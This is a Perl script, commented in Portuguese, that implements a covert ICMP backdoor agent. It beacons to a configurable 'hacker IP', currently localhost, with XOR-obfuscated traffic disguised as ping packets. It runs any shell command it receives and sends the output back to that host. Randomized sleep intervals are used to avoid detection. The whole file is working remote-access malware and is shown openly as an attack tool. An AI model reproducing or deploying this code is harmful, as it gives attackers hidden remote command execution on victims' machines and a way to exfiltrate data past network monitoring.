#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use Time::HiRes qw(sleep);

# --- ATIVAR AUTOFLUSH (Para ver prints na hora) ---
$| = 1;

# --- CONFIGURAÇÕES ---
my $HACKER_IP = "127.0.0.1"; # Se estiver testando na mesma máquina
my $CHAVE_XOR = 0xAA;
my $ALFABETO  = "abcdefghijklmnop";
my $MIN_SLEEP = 3.0;
my $MAX_SLEEP = 10.0;

my $PROTO_ICMP = getprotobyname('icmp');

sub checksum {
    my $msg = shift;
    my $len = length($msg);
    my $sum = 0;
    if ($len % 2) { $msg .= "\0"; $len++; }
    my @shorts = unpack("n*", $msg);
    foreach my $val (@shorts) { $sum += $val; }
    $sum = ($sum >> 16) + ($sum & 0xffff);
    $sum += ($sum >> 16);
    return (~$sum & 0xffff);
}

sub xor_data {
    my $data = shift;
    my $out = "";
    foreach my $byte (split //, $data) { $out .= chr(ord($byte) ^ $CHAVE_XOR); }
    return $out;
}

sub encode_fake_ping {
    my $data = shift;
    my $out = "";
    foreach my $byte (split //, $data) {
        my $val = ord($byte);
        $out .= substr($ALFABETO, ($val >> 4) & 0xF, 1) . substr($ALFABETO, $val & 0xF, 1);
    }
    return $out;
}

sub decode_fake_ping {
    my $data = shift;
    my $out = "";
    for (my $i = 0; $i < length($data); $i += 2) {
        my $h = index($ALFABETO, substr($data, $i, 1));
        my $l = index($ALFABETO, substr($data, $i + 1, 1));
        return undef if ($h == -1 || $l == -1);
        $out .= chr(($h << 4) | $l);
    }
    return $out;
}

sub create_packet {
    my $payload = shift;
    my $camuflado = encode_fake_ping(xor_data($payload));
    my $dummy = pack("C2 n3", 8, 0, 0, 1, 1); 
    my $chk = checksum($dummy . $camuflado);
    return pack("C2 n3", 8, 0, $chk, 1, 1) . $camuflado;
}

sub executar_comando {
    my $cmd = shift;
    print "   [DEBUG] Executando no shell: $cmd\n";
    my $output = qx($cmd 2>&1);
    return $output || "(Sem output)";
}

# --- MAIN ---
socket(SOCKET, PF_INET, SOCK_RAW, $PROTO_ICMP) or die "Erro socket: $!";
my $dest_addr = sockaddr_in(0, inet_aton($HACKER_IP));

print "AGENTE PERL ATIVO. Enviando para $HACKER_IP...\n";

while (1) {
    # Heartbeat
    send(SOCKET, create_packet("HEARTBEAT"), 0, $dest_addr);

    # Select para esperar resposta (timeout 3s)
    my $rin = '';
    vec($rin, fileno(SOCKET), 1) = 1;
    
    if (select($rin, undef, undef, 3.0)) {
        my $recv_data;
        recv(SOCKET, $recv_data, 65535, 0);
        
        if (length($recv_data) > 28) {
            my $payload = substr($recv_data, 28);
            my $decoded = decode_fake_ping($payload);
            
            if (defined $decoded) {
                my $msg = xor_data($decoded);
                
                if ($msg =~ /^CMD:(.*)/) {
                    my $comando = $1;
                    print "Recebido comando: $comando\n";
                    
                    my $resultado = executar_comando($comando);
                    print "   [DEBUG] Resultado size: " . length($resultado) . " bytes\n";
                    
                    # Envia resposta
                    my $res_pkt = create_packet("RES:" . substr($resultado, 0, 500));
                    my $bytes_sent = send(SOCKET, $res_pkt, 0, $dest_addr);
                    
                    if ($bytes_sent) {
                        print "   [DEBUG] Resposta enviada ($bytes_sent bytes).\n";
                    } else {
                        print "   [ERRO] Falha no envio da resposta: $!\n";
                    }
                }
            }
        }
    }
    
    my $sleep = $MIN_SLEEP + rand($MAX_SLEEP - $MIN_SLEEP);
    sleep($sleep);
}
